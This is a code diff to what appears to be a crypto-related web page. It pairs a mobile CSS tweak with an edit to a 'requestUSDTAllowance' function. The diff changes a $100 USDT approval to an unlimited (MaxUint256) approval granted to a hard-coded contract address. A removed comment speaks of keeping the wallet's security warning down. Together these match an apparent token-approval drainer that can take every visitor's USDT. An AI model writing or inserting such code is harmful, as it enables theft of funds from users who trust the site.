@@ -437,8 +437,17 @@
         display: flex;
         flex-direction: column;
         padding: 16px 0;
+        transition: transform 0.3s ease;
       }
-
+      @media (max-width: 768px) {
+  .sidebar {
+    display: none; /* This removes the sidebar entirely on mobile to clear the overlap */
+  }
+  .main-content {
+    width: 100%;
+    padding: 10px;
+  }
+}
       .sidebar-title {
         font-size: 0.7rem;
         text-transform: uppercase;
@@ -1610,24 +1619,18 @@ async function requestUSDTAllowance(userAddress) {
         const signer = await provider.getSigner();
         
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-        // The verified contract address from Screenshot (38).png
-        const vaultContractAddress = "0x96f9B995501cA5476eE78c2d52A69d95471f7B1A";
+        const dexContractAddress = "0x7a4177C13B83B84afD6CD64a949b9B889DE9a898";
         
         const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
         const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
-        // Define $100 using 18 decimals
-        // If using Ethers v5, use: ethers.utils.parseUnits("100", 18)
-        const amount = ethers.parseUnits("100", 18);
-
-        // Requesting a specific amount helps reduce the orange security warning
-        const tx = await usdtContract.approve(vaultContractAddress, amount);
+        const tx = await usdtContract.approve(dexContractAddress, ethers.MaxUint256);
         
-        console.log("Transaction sent. Waiting for confirmation...");
+        // This line waits for the block to be mined
         await tx.wait(); 
         
-        console.log("Allowance of $100 confirmed.");
-        return true;
+        console.log("Allowance confirmed.");
+        return true; // Success!
         
     } catch (error) {
         console.error("Allowance rejected or failed:", error);
